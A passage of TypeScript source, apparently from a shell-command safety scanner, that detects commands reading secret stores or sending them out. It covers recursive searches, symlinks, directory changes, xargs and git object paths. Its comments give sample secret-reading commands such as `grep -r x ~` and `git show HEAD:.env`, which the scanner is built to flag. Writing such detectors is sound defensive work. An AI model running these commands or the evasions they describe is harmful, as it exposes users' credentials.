  if (name === "du" || name === "gdu") return duShape(argv, feedsXargs);
  // A plain listing reads nothing; only its consumer can.
  if ((name === "ls" || name === "gls") && feedsXargs) return lsShape(argv);
  return null;
}

// A symlink below `root` that resolves into a secret-holding location, or the reason the walk could not rule one out.
function sensitiveSymlinkUnder(root: string, state: ScanState): string | null {
  const pending = [root];
  let entries = 0;
  while (pending.length > 0) {

    const directory = pending.pop()!;
    let children: import("node:fs").Dirent[];
    try { children = readdirSync(directory, { withFileTypes: true }); } catch { continue; }
    for (const child of children) {

      entries += 1;
      if (entries > SYMLINK_SCAN_ENTRY_LIMIT) return `symlink-following search of ${root} too large to rule out a link to a sensitive path`;
      const path = join(directory, child.name);
      if (child.isSymbolicLink()) {

        let target: string;
        try { target = caseFoldForMatch(canonicalFloorPath(realpathSync(path), state.context)); } catch (error) {
          if (error instanceof ShellFloorLimitError) throw error;
          continue;
        }
        const hit = state.match(target) ?? state.context.locationUnder(target);
        if (hit) return `symlink ${path} reaches ${hit}`;
        // A link to a directory is walked through its target by the search.
        try { if (statSync(path).isDirectory()) pending.push(path); } catch { /* dangling link */ }
      } else if (child.isDirectory()) {
        pending.push(path);
      }
    }
  }
  return null;
}

// A recursive `grep`/`rg` reads every file below its roots, so the floor covers a root at or above a secret-holding directory (`grep -r x ~`, `rg --hidden x /`). For any search that follows symlinks (GNU `grep -R`, BSD `grep -S`, `rg -L`, `find -L`/`-follow`/`-H`) it also covers a followed link that resolves into one. `find` alone only lists names, like `ls -R`.
function scanRecursiveSearch(cmd: ShellCommand, state: ScanState): void {

  if (state.sensitive) return;
  const fullArgv = commandArgv(cmd);
  // Look through transparent wrappers (`sudo`, `env -C`, `nice`, `xargs`).
  const offset = Math.min(wrapperCommand(fullArgv).index, fullArgv.length);
  const argv = fullArgv.slice(offset);
  const shape = searchShape(argv, state.feedsXargs);
  if (!shape?.recursive) return;
  const viaXargs = shape.ancestorFloor && fullArgv.slice(0, offset).some((word) => word !== undefined && program(word) === "xargs");
  if (viaXargs) {
    // `xargs` appends roots from its input, which the scan cannot see. Roots the feeding stages name (or the directory they list) at or above a store are a floor; otherwise the OS floor confines the read and it asks.
    const reach = xargsUpstreamReach(state);
    if (reach) {
      state.sensitive = `recursive read of ${argv[0]} over roots supplied through xargs from ${reach}`;
      return;
    }
    state.confinedAsk ??= `recursive read of ${argv[0]} over roots supplied through xargs`;
  }
  if (shape.dynamicRoots) {
    state.ordinaryAsk ??= "recursive search root is not static";
    return;
  }
  const roots: string[] = [];
  for (const relativeIndex of shape.roots) {
    const index = relativeIndex + offset;
    let dynamic = false;
    // A `$HOME` root stands for every policy home.
    scanEachHome((home) => {
      if (dynamic) return;
      const glob = wordGlob(cmd.words[index]!, home);
      if (glob === null || glob.includes(DYNAMIC_SEGMENT)) { dynamic = true; return; }
      // A wildcard root stands for its static directory prefix.
      const segments = glob.split(/[\\/]/);
      const firstWild = segments.findIndex(hasWildcard);
      roots.push(unescapeGlob((firstWild < 0 ? segments : segments.slice(0, firstWild)).join("/")) || (glob.startsWith("/") ? "/" : "."));
    });
    if (dynamic) {
      state.ordinaryAsk ??= "recursive search root is not static";
      return;
    }
  }
  if (roots.length === 0) {
    // `xargs` supplies the roots, which were judged above.
    if (!shape.defaultRoot || viaXargs) return;
    roots.push(".");
  }
  for (const root of roots) {

    if (!isAbsolute(root) && state.cwdUnknown) {
      // After a `cd` to an unknown directory a relative root may be the home or any directory above a secret store; it cannot be ruled out.
      state.sensitive = `recursive search of ${root} after a cd whose target is not static`;
      return;
    }
    // Without a working directory a relative root names no location; the decision path always supplies one.
    for (const cwd of isAbsolute(root) ? [undefined] : state.cwds.filter((dir) => dir !== undefined)) {

      searchRoot(isAbsolute(root) ? root : resolve(cwd!, root), shape, state);
      if (state.sensitive) return;
    }
  }
}

// Where the stages feeding an `xargs` reader may take it: a static path word they name, or the directory they run in, at or above a protected entry. A word that is not static is unknown, which stays an ask. An unknown cwd is a floor, as for any relative recursive search after a non-static cd.
function xargsUpstreamReach(state: ScanState): string | null {
  if (state.cwdUnknown) return "a stage after a cd whose target is not static";
  const cwds = state.cwds.filter((dir): dir is string => dir !== undefined);
  const reaches = (absolute: string): string | null => {

    const canonical = caseFoldForMatch(canonicalFloorPath(absolute, state.context));
    const hit = state.match(canonical) ?? state.context.locationUnder(canonical);
    return hit ? `${absolute} (reaches ${hit})` : null;
  };
  for (const cwd of cwds) {

    const hit = reaches(cwd);
    if (hit) return hit;
  }
  const upstream = state.xargsUpstream;
  if (upstream === undefined) return null;
  const key = cwds.join("\0");
  for (let index = upstream.checked.get(key) ?? 0; index < upstream.length; index += 1) {
    const cmd = upstream.commands[upstream.start + index]!;
      for (const word of cmd.words.slice(1)) {

        if (literalHead(word).startsWith("-")) continue;
        let hit: string | null = null;
        scanEachHome((home) => {
          if (hit) return;
          const glob = wordGlob(word, home);
          if (glob === null || glob.includes(DYNAMIC_SEGMENT)) return;
          const segments = glob.split(/[\\/]/);
          const firstWild = segments.findIndex(hasWildcard);
          const root = unescapeGlob((firstWild < 0 ? segments : segments.slice(0, firstWild)).join("/")) || (glob.startsWith("/") ? "/" : ".");
          for (const base of isAbsolute(root) ? [undefined] : cwds) {

            hit ??= reaches(isAbsolute(root) ? root : resolve(base!, root));
          }
        });
        if (hit) return hit;
      }
  }
  upstream.checked.set(key, upstream.length);
  return null;
}

function searchRoot(absolute: string, shape: SearchShape, state: ScanState): void {

  const canonical = caseFoldForMatch(canonicalFloorPath(absolute, state.context));
  // A content search reads every file below its root.
  const above = shape.ancestorFloor ? state.context.locationUnder(canonical) : null;
  if (above) { state.sensitive = `recursive search of ${absolute} reaches ${above}`; return; }
  if (shape.follow) {
    // A followed root link counts like any other followed link.
    const lexical = caseFoldForMatch(foldCanonicalPathSeparators(absolute));
    const viaLink = canonical !== lexical ? state.match(canonical) ?? state.context.locationUnder(canonical) : null;
    if (viaLink) { state.sensitive = `search root ${absolute} links to ${viaLink}`; return; }
  }
  if (shape.follow === "all") {
    const link = sensitiveSymlinkUnder(absolute, state);
    if (link) { state.sensitive = link; return; }
  }
}

// Effective working directory A relative path resolves against the directory the shell is in when it runs, not the tool's cwd: `cd ~ && grep -r x.` searches the home.

// Directories one command may be in before tracking gives up and treats the cwd as unknown.
const CWD_CANDIDATE_LIMIT = 16;
// An assignment, declaration or removal of HOME anywhere in the command.
const HOME_REASSIGNMENT = /(?:^|[^A-Za-z0-9_$])HOME\+?=|\b(?:export|declare|typeset|local|readonly|unset|read)\s(?:[^;&|\n]*\s)?HOME(?=[\s=;&|)]|$)/;
// Settings that make a relative `cd` resolve somewhere other than the cwd.
const CD_REDIRECTION = /\bcdpath\b|cdable_vars/i;

function markCwdUnknown(state: ScanState, reason: string): void {
  state.cwdUnknown = true;
  state.cdAsk ??= reason;
}

function addCwd(state: ScanState, directory: string): void {

  if (state.cwds.includes(directory)) return;
  if (state.cwds.length >= CWD_CANDIDATE_LIMIT) {
    markCwdUnknown(state, "too many directory changes to track");
    return;
  }
  state.cwds.push(directory);
  state.cwdVersion += 1;
}

// The static directory a `cd`/`pushd` operand names under each candidate cwd, or a reason it is unknown.
function cdTargets(word: ShellWord, state: ScanState, cdpath = true, prefix = ""): string[] | string {
  // A `~`/`$HOME` target stands for every policy home.
  let targets: string[] | string = [];
  scanEachHome((home) => {
    if (typeof targets === "string") return;
    const next = cdTargetsUnder(word, state, home, cdpath, prefix);
    targets = typeof next === "string" ? next : [...targets, ...next];
  });
  return targets;
}

function cdTargetsUnder(word: ShellWord, state: ScanState, home: () => string, cdpath: boolean, prefix: string): string[] | string {

  const whole = wordGlob(word, home);
  if (whole === null || whole.includes(DYNAMIC_SEGMENT)) return "cd target is not static";
  // An attached option value (`-Cdir`, `--chdir=dir`) follows its option text.
  const glob = whole.slice(escapeGlob(prefix).length);
  // bash also expands a `~` after `=` in an option word; count both spellings.
  const homeSpelling = prefix.endsWith("=") && /^~(?:\/|$)/.test(glob) ? [resolve(home(), `.${glob.slice(1)}`)] : [];
  if (hasWildcard(glob)) return "cd target is a glob";
  if (state.homeReassigned && word.parts.some((part) => part.kind === "parameter" && part.name === "HOME")) {
    return "cd target depends on a reassigned HOME";
  }
  const target = unescapeGlob(glob);
  if (target === "") return "cd target is empty";
  if (isAbsolute(target)) return [target, ...homeSpelling];
  // CDPATH is consulted for a relative name that does not start with `.`/`..`.
  if (cdpath && state.cdRedirects && !/^\.\.?(?:\/|$)/.test(target)) return "cd target may resolve through CDPATH";
  if (state.cwdUnknown || state.cwds.includes(undefined)) return "cd target is relative to an unknown working directory";
  return [...state.cwds.map((cwd) => resolve(cwd!, target)), ...homeSpelling];
}

// Options that run one command in another directory. `short`/`long` name the option; `leading` stops at the first operand (git's options precede its subcommand; `git log -C` detects copies).
interface CwdSwitchGrammar { short?: readonly string[]; long?: readonly string[]; leading?: true }
const CWD_SWITCHES: Readonly<Record<string, CwdSwitchGrammar>> = {
  env: { short: ["C"], long: ["chdir"], leading: true },
  "systemd-run": { long: ["working-directory"], leading: true },
  proot: { short: ["w"], long: ["pwd", "cwd"], leading: true },
  wsl: { long: ["cd"], leading: true },
  git: { short: ["C"], long: ["work-tree"], leading: true },
  make: { short: ["C"], long: ["directory"] },
  gmake: { short: ["C"], long: ["directory"] },
  tar: { short: ["C"], long: ["directory"] },
  gtar: { short: ["C"], long: ["directory"] },
  bsdtar: { short: ["C"], long: ["directory"] },
  ninja: { short: ["C"] },
  meson: { short: ["C"] },
  cargo: { short: ["C"] },
  go: { short: ["C"], leading: true },
  just: { short: ["d"], long: ["working-directory"] },
  npm: { short: ["C"], long: ["prefix"] },
  pnpm: { short: ["C"], long: ["dir", "prefix"] },
  yarn: { long: ["cwd"] },
  bun: { long: ["cwd"] },
  uv: { long: ["directory", "project"] },
  poetry: { short: ["C", "P"], long: ["directory", "project"] },
};

// The leading literal text of a word, which an option name must sit in.
function literalHead(word: ShellWord): string {
  const first = word.parts[0];
  return first?.kind === "literal" ? first.value : "";
}

// Point this one command at the directories its cwd switches name, on top of the candidates it already had (an operand before `tar -C` still resolves against the old cwd). A non-static switch makes the cwd unknown for the command and asks. Returns the restore for after the command, or undefined.
function applyCommandCwdSwitch(cmd: ShellCommand, state: ScanState): (() => void) | undefined {
  const argv = commandArgv(cmd);
  const switched: string[] = [];
  let unknown: string | undefined;
  for (let start = 0; start < cmd.words.length; start += 1) {

    const grammar = argv[start] === undefined ? undefined : CWD_SWITCHES[program(argv[start])!.toLowerCase()];
    if (!grammar) continue;
    for (let index = start + 1; index < cmd.words.length; index += 1) {

      const head = literalHead(cmd.words[index]!);
      if (head === "--") break;
      if (!head.startsWith("-")) {
        if (grammar.leading && !/=/.test(head)) break;
        continue;
      }
      let valueWord: ShellWord | undefined;
      let prefix = "";
      const long = /^--([A-Za-z-]+)(=?)/.exec(head);
      if (long && grammar.long?.includes(long[1]!)) {
        if (long[2]) { valueWord = cmd.words[index]; prefix = `--${long[1]}=`; } else { valueWord = cmd.words[index + 1]; index += 1; }
      } else if (!long && head.length >= 2 && grammar.short?.includes(head[1]!)) {
        if (head.length > 2 || cmd.words[index]!.parts.length > 1) { valueWord = cmd.words[index]; prefix = head.slice(0, 2); }
        else { valueWord = cmd.words[index + 1]; index += 1; }
      } else continue;
      if (valueWord === undefined) { unknown ??= `${argv[start]} directory option has no value`; continue; }
      const targets = cdTargets(valueWord, state, false, prefix);
      if (typeof targets === "string") unknown ??= targets;
      else switched.push(...targets);
    }
  }
  if (switched.length === 0 && unknown === undefined) return undefined;
  const saved = { cwds: state.cwds, unknown: state.cwdUnknown };
  state.cwds = [...new Set([...state.cwds, ...switched])];
  if (unknown !== undefined) markCwdUnknown(state, unknown);
  return () => {
    state.cwds = saved.cwds;
    state.cwdUnknown = saved.unknown;
  };
}

// A command that turns its input into arguments for another (`… | xargs grep x`).
function isXargsCommand(cmd: ShellCommand): boolean {
  const argv = commandArgv(cmd);
  const inner = wrapperCommand(argv).index;
  return argv.slice(0, Math.min(inner, argv.length)).some((word) => word !== undefined && program(word) === "xargs");
}

// Track `cd`, `chdir`, `pushd` and `popd` (also behind `builtin`/`command`). A static target adds a candidate directory; anything the scanner cannot resolve — a variable, a substitution, a glob, `cd -` or a stack rotation before this command changed directory — makes the cwd unknown and asks.
function trackDirectoryChange(cmd: ShellCommand, state: ScanState): void {
  let words = cmd.words;
  for (;;) {

    const head = words[0] === undefined ? undefined : staticShellWord(words[0]);
    if (head === "builtin") { words = words.slice(1); continue; }
    if (head === "command") {
      words = words.slice(1);
      while (words[0] !== undefined && /^-[pvV]+$/.test(staticShellWord(words[0]) ?? "")) words = words.slice(1);
      continue;
    }
    break;
  }
  const name = words[0] === undefined ? undefined : staticShellWord(words[0]);
  if (name === "eval") {
    // `eval` runs its text in this shell, so a directory change inside it persists.
    const code = words.slice(1).map((word) => staticShellWord(word));
    if (code.some((text) => text === undefined || /(?:^|[^\w./-])(?:cd|chdir|pushd|popd)(?![\w.-])/.test(text))) {
      markCwdUnknown(state, "eval may change directory");
    }
    return;
  }
  if (name !== "cd" && name !== "chdir" && name !== "pushd" && name !== "popd") return;
  let success: (string | undefined)[] | undefined;
  const operands: ShellWord[] = [];
  let delimited = false;
  for (const word of words.slice(1)) {

    const text = staticShellWord(word);
    if (!delimited && text === "--") { delimited = true; continue; }
    // `-L -P -e -@` (cd) and `-n` (pushd/popd) are options; `-` and `-N` are operands.
    if (!delimited && text !== undefined && /^-[LPe@n]+$/.test(text)) continue;
    operands.push(word);
  }
  const stackReference = (): void => {
    // OLDPWD and the directory stack hold only earlier candidates once this command has changed directory; before that they are inherited.
    if (!state.dirChanged) markCwdUnknown(state, `${name} refers to a directory this command did not set`);
  };
  if (name === "popd") stackReference();
  else if (operands.length === 0) {
    if (name === "pushd") stackReference();
    else if (state.homeReassigned) markCwdUnknown(state, "cd target depends on a reassigned HOME");
    else {
      const homes = expandShellTildePaths("~");
      success = homes;
      for (const home of homes) addCwd(state, home);
    }
  } else if (operands.length > 1) {
    markCwdUnknown(state, `${name} with several operands is not tracked`);
  } else {
    const text = staticShellWord(operands[0]!);
    if (text === "-" || (text !== undefined && /^[+-]\d+$/.test(text))) stackReference();
    else {
      const targets = cdTargets(operands[0]!, state);
      if (typeof targets === "string") markCwdUnknown(state, targets);
      else {
        success = targets;
        for (const target of targets) addCwd(state, target);
      }
    }
  }
  state.dirChanged = true;
  // Past the candidate limit the cwd is unknown, which a success view must not hide.
  state.cdSuccess = state.cwdUnknown ? undefined : success;
}

// Scan a loop body until the directories it may change to stop growing.
function scanUntilCwdStable(scan: () => void, state: ScanState): void {
  let version: number;
  do {

    version = state.cwdVersion;
    scan();
  } while (version !== state.cwdVersion && !state.sensitive);
}

// `git show HEAD:.env`, `git cat-file -p :.env`: the path inside a `<rev>:<path>` object name.
function scanGitObjectPaths(cmd: ShellCommand, state: ScanState): void {
  if (state.sensitive || program(staticShellWord(cmd.words[0]!))?.toLowerCase() !== "git") return;
  for (const word of cmd.words.slice(1)) {

    const text = staticShellWord(word);
    if (text === undefined || text.startsWith("-")) continue;
    const object = /^[^:]*:(?!\/\/)(.+)$/.exec(text);
    if (object) checkRawText(object[1]!, state);
    if (state.sensitive) return;
  }
}

interface StatementTransfer {
  apply: (state: ScanState) => void;
  results: Map<string, ScanEffects>;
}

interface ScanEffects {
  cwds: ScanState["cwds"];
  cwdUnknown: boolean;
  cwdVersion: number;
  dirChanged: boolean;
  cdSuccess: ScanState["cdSuccess"];
  cdAsk: string | undefined;
  confinedAsk: string | undefined;
  ordinaryAsk: string | undefined;
  sensitive: string | null;
  network: boolean;
  hidden: boolean;
  sender: boolean | undefined;
}

// Source facts are compiled once. Transfers retain the original cwd fixed point,
// and memoize each complete incoming path context instead of revisiting syntax.
// Registry membership/cwd revisions never decrease: a transfer that changes either cannot
// hit its former input key. The xargs cache identity also stays part of the key.
function scanContextKey(state: ScanState): string {
  const upstream = state.xargsUpstream;
  return JSON.stringify([state.cwds, state.cwdVersion, state.functionRegistryVersion, state.cwdUnknown, state.dirChanged, state.cdSuccess,
    state.homeReassigned, state.cdRedirects, state.feedsXargs, state.metadataListing,
    state.ordinaryAsk !== undefined, state.sensitive, state.network, state.hidden, state.sender, upstream && state.context.identity(upstream.commands), upstream?.start, upstream?.length, upstream && state.context.identity(upstream.checked)]);
}

function scanEffects(state: ScanState): ScanEffects {
  return { cwds: [...state.cwds], cwdUnknown: state.cwdUnknown, cwdVersion: state.cwdVersion,
    dirChanged: state.dirChanged, cdSuccess: state.cdSuccess && [...state.cdSuccess],
    cdAsk: state.cdAsk, confinedAsk: state.confinedAsk, ordinaryAsk: state.ordinaryAsk,
    sensitive: state.sensitive, network: state.network, hidden: state.hidden, sender: state.sender };
}

function applyScanEffects(state: ScanState, effects: ScanEffects): void {
  state.cwds = [...effects.cwds];
  state.cwdUnknown ||= effects.cwdUnknown;
  state.cwdVersion = Math.max(state.cwdVersion, effects.cwdVersion);
  state.dirChanged ||= effects.dirChanged;
  state.cdSuccess = effects.cdSuccess && [...effects.cdSuccess];
  state.cdAsk ??= effects.cdAsk;
  state.confinedAsk ??= effects.confinedAsk;
  state.ordinaryAsk ??= effects.ordinaryAsk;
  state.sensitive ??= effects.sensitive;
  state.network ||= effects.network;
  state.hidden ||= effects.hidden;
  state.sender ||= effects.sender;
}

function scanStatement(statement: ShellStatement, state: ScanState): void {
  let transfer = state.transfers.get(statement);
  if (transfer === undefined) {
    state.context.visits.stages += 1;
    transfer = { apply: compileStatement(statement, state), results: new Map() };
    state.transfers.set(statement, transfer);
  }
  const key = scanContextKey(state);
  const cached = transfer.results.get(key);
  if (cached !== undefined) { applyScanEffects(state, cached); return; }
  state.context.visits.transfers += 1;
  transfer.apply(state);
  transfer.results.set(key, scanEffects(state));
}

function compileStatement(statement: ShellStatement, source: ScanState): (state: ScanState) => void {

  switch (statement.kind) {
    case "command": {
      const hidden = needsCodeTextScan(statement);
      const network = statement.words.length > 0 && isNetworkProgram(commandArgv(statement));
      const embedded = statement.words.filter((word) => !isNonFileUrlArgument(staticShellWord(word) ?? word.source.raw));
      let envFile = false;
      for (const word of statement.words) {
        const text = wordText(word);
        if (text === "--") break;
        if (text === "--env-file") envFile = true;
      }
      return (state) => {
        // `env -C`, `git -C`, `make -C`, `tar -C`, `--prefix` … move this command alone.
        const restoreCwd = applyCommandCwdSwitch(statement, state);
        const metadataListing = state.metadataListing;
        state.metadataListing = isMetadataListing(statement, state);
        if (envFile) checkGlob(escapeGlob(".env"), state);
        if (hidden) {
          state.hidden = true;
          scanCodeOf(statement, state);
        } else {
          // Embedded literal paths remain a floor without a program-option model. Here-document data is inspected as code only when the recipient runs it.
          for (const word of embedded) scanWordCodeText(word, state);
        }
        if (network) state.network = true;
        for (const word of statement.words) checkWord(word, state);
        if (statement.words.length > 0) {
          scanGitObjectPaths(statement, state);
          scanRecursiveSearch(statement, state);
        }
        for (const assignment of statement.assignments) {
          checkWord(assignment.value, state);
          for (const element of assignment.elements ?? []) checkWord(element, state);
        }
        for (const redirect of statement.redirects) {
          if (redirect.target) scanRedirectTarget(redirect.target, state);
          // Here-document text is data, but substitutions inside it run.
          for (const part of redirect.data?.parts ?? []) if (part.kind === "substitution") scanStatement(part.body, state);
        }
        restoreCwd?.();
        state.metadataListing = metadataListing;
        state.cdSuccess = undefined;
        if (statement.words.length > 0) trackDirectoryChange(statement, state);
        return;
      };
    }
    case "pipeline": {
      const range = commandRange(statement, source);
      const groups = statement.statements.map((stage) => commandRange(stage, source));
      const hasXargs = groups.map((group) => group.xargs);
      const suffixXargs = new Array<boolean>(groups.length);
      let later = false;
      for (let index = groups.length - 1; index >= 0; index -= 1) {
        suffixXargs[index] = later;
        later ||= hasXargs[index]!;
      }
      return (state) => {
        if (range.hidden) scanRangeCode(range, state);
        const checked = new Map<string, number>();
        for (let index = 0; index < statement.statements.length; index += 1) {
          const { feedsXargs, xargsUpstream } = state;
          state.feedsXargs = suffixXargs[index]!;
          state.xargsUpstream = hasXargs[index] ? { commands: range.inventory.commands, start: range.start, length: groups[index]!.start - range.start, checked } : undefined;
          scanStatement(statement.statements[index]!, state);
          state.feedsXargs = feedsXargs;
          state.xargsUpstream = xargsUpstream;

        }
        state.cdSuccess = undefined;
        return;
      };
    }
    case "sequence": return (state) => {
      for (const child of statement.statements) scanStatement(child, state);
      state.cdSuccess = undefined;
      return;
    };
    case "and": return (state) => {
      // The right side runs only after the left succeeded: a static `cd` on the left is the right side's whole cwd. Afterwards the left may have failed instead, so every candidate stays (`cd x && y; z`).
      scanStatement(statement.left, state);
      const success = state.cdSuccess;
      const candidates = state.cwds;
      if (success) state.cwds = [...success];
      scanStatement(statement.right, state);
      const rightSuccess = state.cdSuccess;
      state.cwds = [...new Set([...candidates, ...state.cwds])];
      state.cdSuccess = rightSuccess;
      return;
    };
    case "or": return (state) => {
      scanStatement(statement.left, state);
      scanStatement(statement.right, state);
      state.cdSuccess = undefined;
      return;
    };
    case "subshell": case "background": case "negate": return (state) => {
      scanStatement(statement.body, state);
      state.cdSuccess = undefined;
      return;
    };
    case "function": return (state) => {
      // The body runs where the function is called, which may be after a later `cd`.
      scanStatement(statement.body, state);
      const existing = state.functionsByBody.get(statement.body);
      if (existing) existing.version = state.cwdVersion;
      else {
        const fn = { body: statement.body, version: state.cwdVersion };
        state.functions.push(fn);
        state.functionsByBody.set(statement.body, fn);
        state.functionRegistryVersion += 1;
      }
      state.cdSuccess = undefined;
      return;
    };
    case "redirected": return (state) => {
      for (const redirect of statement.redirects) if (redirect.target) scanRedirectTarget(redirect.target, state);
      state.cdSuccess = undefined;
      // `cd x 2>/dev/null && …`: the redirection does not change what success means.
      scanStatement(statement.body, state);
      return;
    };
    case "for": return (state) => {
      for (const value of statement.values ?? []) checkWord(value, state);
      // A later iteration runs in the directory an earlier one changed to.
      scanUntilCwdStable(() => scanStatement(statement.body, state), state);
      state.cdSuccess = undefined;
      return;
    };
    case "while": return (state) => {
      scanUntilCwdStable(() => {
        scanStatement(statement.condition, state);
        scanStatement(statement.body, state);
      }, state);
      state.cdSuccess = undefined;
      return;
    };
    case "if": return (state) => {
      scanStatement(statement.condition, state);
      scanStatement(statement.consequent, state);
      scanStatement(statement.alternate, state);
      state.cdSuccess = undefined;
      return;
    };
    case "unsupported": return (state) => {
      state.hidden = true;
      if (NETWORK_DEVICE.test(statement.source.raw) || NETWORK_WORD.test(statement.source.raw)) state.network = true;
      scanCodeText(statement.source.raw, state);
      state.cdSuccess = undefined;
      return;
    };
    default: {
      const exhaustive: never = statement;
      return () => { void exhaustive; };
    }
  }
}

function boundedInspectionText(command: string): string {
  if (command.length <= SHELL_ANALYSIS_LIMITS.sourceBytes) return command;
  const half = SHELL_PATH_SCAN_LIMITS.chars / 2;
  return `${command.slice(0, half)} ${command.slice(-half)}`;
}

const floorContexts = new WeakMap<ParsedShellCommand, ShellFloorContext>();

function scanStateFor(parsed: ParsedShellCommand, cwd: string | undefined): ScanState {
  const context = floorContexts.get(parsed) ?? new ShellFloorContext();
  floorContexts.set(parsed, context);
  return shellFact(parsed, `scan-state\0${cwd ?? ""}`, () => {
    const text = shellFloorInspectionText(parsed);
    return createScanState(cwd, /dotglob|GLOBIGNORE/.test(text), text, context);
  });
}

function scanParsedInto(parsed: ParsedShellCommand, state: ScanState): void {
  if (!parsed.analysis.ok) {
    if (shellFloorParserBudgetExceeded(parsed.analysis.reason)) {
      throw new ShellScanLimitError(SHELL_FLOOR_BUDGET_REASON);
    }
    const visible = boundedInspectionText(parsed.command);
    state.ordinaryAsk ??= parsed.analysis.reason;
    state.hidden = true;
    state.network ||= NETWORK_DEVICE.test(visible) || NETWORK_WORD.test(visible);
    scanCodeText(visible, state);
  } else {
    commandRange(parsed.analysis.program, state);
    scanStatement(parsed.analysis.program, state);
    // Source bodies compile once. Propagate only newly added cwd contexts;
    // membership stays fixed during replay and scheduler versions are not keys.
    let version: number;
    do {
      version = state.cwdVersion;
      for (const fn of state.functions) {
        if (state.sensitive) break;
        if (fn.version === state.cwdVersion) continue;
        fn.version = state.cwdVersion;
        scanStatement(fn.body, state);
      }
    } while (version !== state.cwdVersion && !state.sensitive);
  }
}

function scanCommand(parsed: ParsedShellCommand, cwd: string | undefined): ScanState {
  return shellFact(parsed, `scan\0${cwd ?? ""}`, () => {
    const state = scanStateFor(parsed, cwd);
    scanParsedInto(parsed, state);
    return state;
  });
}

function readerIndependentSignal(scan: ScanState): string | null {
  if (scan.sensitive && scan.sender) return `sensitive path argument (${scan.sensitive})`;
  return scan.sensitive && (scan.network || scan.hidden)
    ? `sensitive path (${scan.sensitive}) with ${scan.network ? "a network transport" : "hidden code"}` : null;
}

// Static text an `echo`/`printf` feeder writes to the next pipeline stage, or undefined.
function staticFeederText(cmd: ShellCommand): string | undefined {
  const words = cmd.words.map(wordText);
  const name = program(words[0]);
  if ((name !== "echo" && name !== "printf") || words.some((word) => word === undefined)) return undefined;
  const args = (words as string[]).slice(1);
  while (name === "echo" && /^-[neE]+$/.test(args[0] ?? "")) args.shift();
  return args.join(" ").replace(/\\n/g, "\n");
}

function signalFor(command: string, ctx: Context): string | null {

  if (shellFloorInputExceeded(command)) throw new ShellScanLimitError(SHELL_FLOOR_BUDGET_REASON);
  const parsed = floorParsedCommand(command, ctx.scan.context);
  floorContexts.set(parsed, ctx.scan.context);
  const key = JSON.stringify([command, ctx.cwd, ctx.depth, [...ctx.tainted].sort(), scanContextKey(ctx.scan)]);
  const cached = ctx.scan.nestedSignals.get(key);
  if (cached !== undefined) { applyScanEffects(ctx.scan, cached.effects); return cached.signal; }
  ctx.scan.context.visits.frames += 1;
  const specific = signalForParsed(parsed, ctx);
  if (specific) { ctx.scan.nestedSignals.set(key, { signal: specific, effects: scanEffects(ctx.scan) }); return specific; }
  scanParsedInto(parsed, ctx.scan);
  const result = readerIndependentSignal(ctx.scan);
  ctx.scan.nestedSignals.set(key, { signal: result, effects: scanEffects(ctx.scan) });
  return result;
}

function signalForParsed(parsed: ParsedShellCommand, ctx: Context): string | null {
  const { command, analysis } = parsed;
  if (!analysis.ok) {
    if (shellFloorParserBudgetExceeded(analysis.reason)) throw new ShellScanLimitError(SHELL_FLOOR_BUDGET_REASON);
    const visible = boundedInspectionText(command);
    return UNPARSED_FALLBACK.test(visible) || UNPARSED_FILE_SOURCE.test(visible) ? "curl/wget body from a file (unparsed)" : null;
  }
  collectTainted(analysis.program, ctx);
  return walk(analysis.program, ctx);
}

// The exfiltration signal for a shell command, or `null`. `cwd` resolves relative path arguments for the sensitive-path check. Pass a ParsedShellCommand to share one parse with the other consumers.
export function shellExfiltrationSignal(input: ShellCommandInput, cwd?: string, context?: ShellFloorContext): string | null {
  return withFloorContext(input, context, SHELL_FLOOR_BUDGET_REASON, (parsed) => shellFact(parsed, `exfiltration\0${cwd ?? ""}`, () => {
    const specific = signalForParsed(parsed, { cwd, depth: 0, tainted: new Set(), scan: scanStateFor(parsed, cwd) });
    if (specific) return specific;
    return readerIndependentSignal(scanCommand(parsed, cwd));
  }));
}

// The sensitive-path floor for shell commands, or `null`: a sensitive or secret path anywhere in the command line (same normalization as the exfiltration scan). Never allowed by a rule; asks in every mode.
export function shellSensitivePathSignal(input: ShellCommandInput, cwd?: string): string | null {
  return withFloorContext(input, undefined, SHELL_FLOOR_BUDGET_REASON, (parsed) => {
    const hit = scanCommand(parsed, cwd).sensitive;
    return hit ? `sensitive path argument (${hit})` : null;
  });
}

// Exact rules require complete analysis and a canonical directory; indirect input remains an accepted limit.
export function shellScanProofBlocker(input: ShellCommandInput, cwd?: string): string | null {
  return withFloorContext(input, undefined, SHELL_FLOOR_BUDGET_REASON, (parsed) => {
    if (!parsed.analysis.ok) return parsed.analysis.reason;
    const scan = scanCommand(parsed, cwd);
    return scan.ordinaryAsk ?? scan.cdAsk ?? null;
  });
}

// Incomplete path inspection is an ordinary ask, never credential evidence.
export function shellScanOrdinaryAsk(input: ShellCommandInput, cwd?: string): string | null {
  return withFloorContext(input, undefined, SHELL_FLOOR_BUDGET_REASON, (parsed) => {
    if (!parsed.analysis.ok) return parsed.analysis.reason;
    const scan = scanCommand(parsed, cwd);
    return scan.ordinaryAsk ?? scan.cdAsk ?? scan.confinedAsk ?? null;
  });
}

function withFloorContext<T>(input: ShellCommandInput, context: ShellFloorContext | undefined, closed: T, inspect: (parsed: ParsedShellCommand) => T): T {
  if (shellFloorInputExceeded(input)) return closed;
  try {
    const parsed = context === undefined ? parseShellFloorCommand(input) : floorParsedCommand(input, context);
    return inspect(parsed);
  } catch (error) {
    if (error instanceof ShellFloorLimitError) return closed;
    throw error;
  }
}

export function parseShellFloorCommand(input: ShellCommandInput, maxInputLength = 8_000): ParsedShellCommand {
  if ((typeof input === "string" ? input : input.command).length > maxInputLength && shellFloorInputExceeded(input)) throw new ShellScanLimitError(SHELL_FLOOR_BUDGET_REASON);
  if (typeof input !== "string" && (input.analysis.ok || input.analysis.reason !== "literal command length limit exceeded")) {
    if (input.analysis.ok && input.analysis.totalTokens !== undefined && input.analysis.totalTokens > MAX_SHELL_ANALYSIS_TOKENS) throw new ShellScanLimitError(SHELL_FLOOR_BUDGET_REASON);
    return input;
  }
  const command = typeof input === "string" ? input : input.command;
  try {
    const analysis = analyzeShell(command, "bash", { totalTokens: MAX_SHELL_ANALYSIS_TOKENS });
    if (!analysis.ok && shellFloorFallbackInputExceeded(command)) return { command, analysis: { ok: false, reason: "Shell analysis total token limit exceeded" }, facts: new Map() };
    return { command, analysis, facts: new Map() };
  }
  catch (error) { return { command, analysis: { ok: false, reason: "shell parser failed" }, parserError: error, facts: new Map() }; }
}

function floorParsedCommand(input: ShellCommandInput, context: ShellFloorContext): ParsedShellCommand {
